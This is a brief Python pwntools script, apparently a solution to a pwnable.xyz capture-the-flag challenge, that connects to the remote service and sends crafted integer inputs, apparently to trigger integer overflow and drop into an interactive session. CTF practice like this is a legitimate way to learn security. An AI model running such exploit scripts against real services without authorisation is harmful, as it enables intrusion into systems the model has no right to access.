from pwn import *

#p = process("challenge/challenge")
p = remote("svc.pwnable.xyz", 30008)

p.sendlineafter(b"x: ", b"0")
p.sendlineafter(b"y: ", b"4294965959")

p.sendlineafter(b"=== t00leet ===\n", b"3 1431656211")

p.sendlineafter(b"=== 3leet ===\n", b"1 1 1 2 5")

p.interactive()